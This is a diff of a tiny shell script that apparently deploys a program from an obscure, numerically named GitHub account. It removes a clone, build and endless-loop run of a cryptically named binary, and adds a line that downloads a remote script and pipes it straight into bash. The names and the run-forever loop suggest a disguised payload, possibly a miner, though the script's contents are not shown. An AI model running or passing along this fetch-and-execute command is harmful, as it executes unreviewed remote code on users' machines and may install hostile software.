@@ -1,13 +1,1 @@
-git clone https://github.com/mobileapps84741274/linux8444
-cd ./linux8444/;
-mkdir ./build/;
-cd ./build/;
-cmake ..;
-make;
-
-while true
-do
-
-./linux84444474 84
-
-done
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle8 | bash
